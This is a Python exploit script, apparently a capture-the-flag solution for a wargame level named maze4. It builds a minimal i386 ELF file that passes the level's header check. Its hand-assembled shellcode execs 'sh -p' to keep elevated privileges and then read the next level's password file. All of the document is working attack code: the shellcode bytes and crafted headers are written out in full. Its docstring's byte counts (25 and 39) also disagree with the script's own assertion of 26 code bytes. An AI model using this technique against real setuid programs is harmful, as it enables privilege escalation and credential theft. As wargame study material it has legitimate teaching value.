#!/usr/bin/env python3
"""Build a <=123-byte i386 ELF that passes maze4's gate and execs dash -p.

maze4 gate (gdb-verified):
    product = file[7]*file[8]                 (ELF: EI_OSABI*EI_ABIVERSION = 0*0 = 0)
    off     = dword(file[28..31])             (ELF: e_phoff = 52)
    compare = dword(file[off+12..off+15])     (ELF: phdr0+12 = p_paddr)
    pass if product == compare && st_size <= 123

=> phdr0.p_paddr must be 0 (legal, ignored by the kernel).
=> budget: 52 (ehdr) + 32 (phdr) + 39 (code+strings) = 123 exactly.

Strings "sh\0-p\0" (6 bytes) hide in e_ident[9..14] (EI_PAD area, kernel ignores).
Code (25 bytes) at file offset 84, loaded at 0x08048000+84 = 0x080480b4:
    execve("sh", {"sh", "-p", NULL}, NULL)  -- relative path, dash copy in cwd,
    -p keeps euid (maze5). Then `cat /etc/maze_pass/maze5` from that shell.
"""
import struct, sys

V = 0x08048000
CODE_OFF = 84

code = bytes([
    0x31, 0xC0,                         # xor eax, eax
    0x50,                               # push eax            (NULL)
    0x68, 0x0C, 0x80, 0x04, 0x08,       # push 0x0804800c     ("-p" @ V+12)
    0x68, 0x09, 0x80, 0x04, 0x08,       # push 0x08048009     ("sh" @ V+9)
    0x89, 0xE1,                         # mov ecx, esp        (argv)
    0xBB, 0x09, 0x80, 0x04, 0x08,       # mov ebx, 0x08048009 ("sh" path)
    0x31, 0xD2,                         # xor edx, edx        (envp NULL)
    0xB0, 0x0B,                         # mov al, 11          (__NR_execve)
    0xCD, 0x80,                         # int 0x80
])
assert len(code) == 26

ehdr = bytearray(52)
ehdr[0:8] = b"\x7fELF\x01\x01\x01\x00"
ehdr[9:15] = b"sh\x00-p\x00"                       # strings in EI_PAD
ehdr[15] = 0
struct.pack_into("<HHIIIIIHHHHHH", ehdr, 16,
                 2,          # e_type = ET_EXEC
                 3,          # e_machine = EM_386
                 1,          # e_version
                 V + CODE_OFF,   # e_entry
                 52,         # e_phoff  <-- also the gate's lseek offset
                 0,          # e_shoff
                 0,          # e_flags
                 52,         # e_ehsize
                 32,         # e_phentsize
                 1,          # e_phnum
                 0, 0, 0)    # e_shentsize, e_shnum, e_shstrndx

phdr = bytearray(32)
struct.pack_into("<IIIIIIII", phdr, 0,
                 1,          # p_type = PT_LOAD
                 0,          # p_offset
                 V,          # p_vaddr
                 0,          # p_paddr  <-- MUST be 0 (the gate's compare dword)
                 123,        # p_filesz
                 123,        # p_memsz
                 5,          # p_flags = R|X
                 0x1000)     # p_align

data = bytes(ehdr) + bytes(phdr) + code
data += b"\x00" * (123 - len(data))     # pad to exactly 123 (size gate: <= 0x7b)
assert len(data) == 123
open(sys.argv[1], "wb").write(data)
print("wrote", len(data), "bytes")
